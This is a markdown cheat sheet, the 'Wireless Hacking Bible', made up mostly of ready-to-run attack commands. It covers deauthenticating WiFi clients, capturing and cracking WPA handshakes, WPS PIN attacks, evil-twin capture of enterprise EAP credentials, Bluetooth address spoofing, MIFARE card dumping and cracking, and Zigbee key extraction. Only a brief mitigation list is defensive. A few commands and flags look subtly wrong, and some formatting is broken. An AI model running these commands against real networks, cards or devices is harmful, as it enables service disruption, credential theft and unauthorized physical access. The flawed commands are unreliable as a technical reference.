# Wireless Hacking Bible

## WiFi Auditing

### Setup
- Monitor mode: `ip link set wlan0 down && iw wlan0 set monitor none && ip link set wlan0 up`
- Managed mode: `ip link set wlan0 down && iw wlan0 set type managed && ip link set wlan0 up`

### Discovery
- `airodump-ng wlan0` - Discover networks
- `airodump-ng wlan0 --channel 6 --bssid AA:BB:CC:DD:EE:FF` - Target specific AP
- `wash -i wlan0` - Discover WPS-enabled networks

### Handshake Capture
- `airodump-ng wlan0 --bssid <AP> --channel <CH> --write capture`
- `aireplay-ng -0 10 -a <AP> wlan0` - Deauth client to trigger reconnection
- Verify handshake: `aircrack-ng capture-01.cap`

### WEP Cracking
- `aireplay-ng -4 -b <AP> -h <CLIENT> wlan0` - ARP replay
- `packetforge-ng -0 -a <AP> -h <CLIENT> -k 255.255.255.255 -l 255.255.255.255 -y prga.xor -w arp.cap`
- `aircrack-ng arp.cap` - Crack WEP

### WPA/WPA2 Cracking
- Dictionary attack: `aircrack-ng handshake.cap -w wordlist.txt`
- PMKID attack: `hashcat -m 16800 capture.pcapng wordlist.txt`

### WPA3
- Dictionary attack on SAE
- Offline password guessing
- Downgrade attacks to WPA2

## WPS Attacks

### Pixie Dust
- `wash -i wlan0` - Find WPS APs
- `reaver -i wlan0 -b <AP> -vvv` - Pixie dust attack

### Brute Force
- `reaver -i wlan0 -b <AP> -vvv -c <CH> -p <PIN>`

### Replay Attack
- `reaver -i wlan0 -b <AP> -vvv -L` - PIN bypass

## Enterprise WiFi

### 802.1X/EAP
- **Hostapd-wpe** - Evil twin with EAP
- `hostapd-wpe hostapd-wpe.conf`
- Capture MS-CHAPv2 challenges

### Cracking EAP
- `asleap -r capture.pcap -f challenge.dat -s challenge.hex`
- Dictionary attack on handshake

### GPO/PEAP
- Fake RADIUS server
- Strip PEAP outer identity

## Bluetooth

### Discovery
- `hcitool scan` - Classic Bluetooth
- `btle_scan` - BLE scanning
- `bluehydra` - Multi-tool scanner

### Spoofing
- `bdaddr -i hci0 AA:BB:CC:DD:EE:FF` - Change BD_ADDR
- `macchanger` - Spoof MAC

### Attacks
- **BlueZ** - Linux Bluetooth stack
- **Bluelog** - Bluetooth discovery
- **Bluesnarfer** - OBEX exploitation
- **BlueRanger** - Find Bluetooth devices by RSSI
- **Spooftooph** - Spoof Bluetooth device info

### BLE
- **gattacker** - BLE exploitation
- **BTVS** - BLE tools (via Wireshark)
- **hcitool lescan` - Discover BLE devices
- **gatttool` - Interact with BLE services

## RFID

### Proxmark3
- `proxmark3 -c "hf search"` - Find RFID
- `proxmark3 -c "hf mf dump"` - Dump MIFARE
- `proxmark3 -c "hf mf nested"` - Nested attack

### ACR122U
- `libnfc` tools - Read/write RFID
- `mfoc` - MIFARE Classic cracker
- `mfcuk` - Nested attack implementation

### Other
- **T5555/T5557** - Read/write
- **iClass** - HID iClass
- **Indala** - Indala readers

## Zigbee

### Tools
- **KillerBee** - Zigbee exploitation framework
- **ZigbeeSniffer** - Capture Zigbee traffic
- **Attify** - Zigbee auditing tool

### Attacks
- Traffic capture
- Replay attacks
- Key extraction
- Firmware extraction

## Traffic Analysis

### Wireshark Filters
- `wlan.addr == AA:BB:CC:DD:EE:FF` - Filter by MAC
- `wlan.ssid == "Target Network"` - Filter by SSID
- `eapol` - EAPOL handshakes

### Bettercap
- `bettercap -I wlan0` - Interactive
- `wifi.recon on` - Start WiFi recon
- `wifi.deauth <AP>` - Deauth attack

### Eaphammer
- `eaphammer -i wlan0 --channel 6 --bssid <AP> --auth wpa-eap --creds`
- EAP attacks against enterprise

## Mitigation

### WiFi Security
- WPA3 with SAE
- Strong SSID/password
- Disable WPS
- Network segmentation
- RADIUS authentication (802.1X)

### Bluetooth Security
- Pairing mode only when needed
- Disable discoverable mode
- Encrypted connections only

### Monitoring
- Wireless IDS (WIDS)
- AP scanning
- RF monitoring

## Tools
- Aircrack-ng Suite
- Bettercap
- Eaphammer
- Wifite2
- Fluxion
- Hostapd-wpe
- Reaver
- Wash
- Hashcat
- Cowpatty
- Pyrit
- John the Ripper
- Proxmark3
- Ubertooth One
- KillerBee
- BlueZ tools

## References
- Aircrack-ng Wiki
- HackTricks - Wireless
- OWASP Wireless